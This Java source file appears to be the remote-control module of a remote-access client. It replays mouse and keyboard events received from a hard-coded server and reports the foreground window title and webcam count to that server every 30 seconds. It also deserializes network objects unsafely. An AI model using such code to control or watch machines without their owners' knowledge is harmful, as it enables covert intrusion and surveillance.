package br.com.introcdc.connect.client.components;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:56
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.remote.RemoteEvent;
import com.github.sarxos.webcam.Webcam;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import oshi.SystemInfo;

import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.io.ObjectInputStream;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class ControlComponents {

    // Control Variables
    public static Robot ROBOT_INSTANCE;
    public static boolean ROBOT = true;

    public static void startUpdater() {
        ConnectClient.EXECUTOR.scheduleAtFixedRate(ControlComponents::sendBasicInfo, 1, 30, TimeUnit.SECONDS);
    }

    public static void sendBasicInfo() {
        try {
            SystemInfo si = new SystemInfo();
            ConnectClient.msg("updateinfo " + si.getHardware().getDisplays().size() + " " + Webcam.getWebcams().size() + " " + getActiveWindowTitle());
        } catch (Exception ignored) {
            ConnectClient.msg("updateinfo 0 0 " + getActiveWindowTitle());
        }
    }

    public static void typeString(Robot robot, String text) {
        try {
            for (char c : text.toCharArray()) {
                try {
                    int keyCode = KeyEvent.getExtendedKeyCodeForChar(c);
                    if (KeyEvent.CHAR_UNDEFINED == keyCode) {
                        continue;
                    }

                    if (Character.isUpperCase(c) || FileComponents.isSpecialCharacter(c)) {
                        robot.keyPress(KeyEvent.VK_SHIFT);
                    }

                    robot.keyPress(keyCode);
                    robot.keyRelease(keyCode);

                    if (Character.isUpperCase(c) || FileComponents.isSpecialCharacter(c)) {
                        robot.keyRelease(KeyEvent.VK_SHIFT);
                    }

                    robot.delay(50);

                } catch (IllegalArgumentException ignored) {
                }
            }
            ConnectClient.msg("Texto " + text + " digitado!");
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao digitar um texto! (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

    public static void clickLeft(Robot robot) {
        robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
        robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
    }

    public static void clickRight(Robot robot) {
        robot.mousePress(InputEvent.BUTTON3_DOWN_MASK);
        robot.mouseRelease(InputEvent.BUTTON3_DOWN_MASK);
    }

    public static void clickMiddle(Robot robot) {
        robot.mousePress(InputEvent.BUTTON2_DOWN_MASK);
        robot.mouseRelease(InputEvent.BUTTON2_DOWN_MASK);
    }

    public static void startControlClient() {
        try (Socket socket = new Socket(Connect.IP, Connect.PORT + 6);
             ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {

            while (ImageComponents.SCREEN_LIVE) {
                Object obj = ois.readObject();
                if (obj instanceof RemoteEvent) {
                    RemoteEvent event = (RemoteEvent) obj;
                    handleEvent(ROBOT_INSTANCE, event);
                }
            }
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao processar a mensagem de controle remoto (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

    public static void handleEvent(Robot robot, RemoteEvent event) {
        if (event.getType() == RemoteEvent.Type.MOUSE_MOVE) {
            robot.mouseMove(event.getX(), event.getY());
        } else if (event.getType() == RemoteEvent.Type.MOUSE_PRESS) {
            robot.mousePress(getMouseMask(event.getButton()));
        } else if (event.getType() == RemoteEvent.Type.MOUSE_RELEASE) {
            robot.mouseRelease(getMouseMask(event.getButton()));
        } else if (event.getType() == RemoteEvent.Type.KEY_PRESS) {
            robot.keyPress(event.getKeyCode());
        } else if (event.getType() == RemoteEvent.Type.KEY_RELEASE) {
            robot.keyRelease(event.getKeyCode());
        } else if (event.getType() == RemoteEvent.Type.MOUSE_WHEEL) {
            robot.mouseWheel(event.getWheelAmount());
        }
    }

    public static int getMouseMask(int button) {
        if (button == 2) {
            return InputEvent.BUTTON2_DOWN_MASK;
        } else if (button == 3) {
            return InputEvent.BUTTON3_DOWN_MASK;
        } else {
            return InputEvent.BUTTON1_DOWN_MASK;
        }
    }

    public static String getActiveWindowTitle() {
        char[] buffer = new char[1024];
        WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
        User32.INSTANCE.GetWindowText(hwnd, buffer, buffer.length);
        return Native.toString(buffer).trim();
    }

}
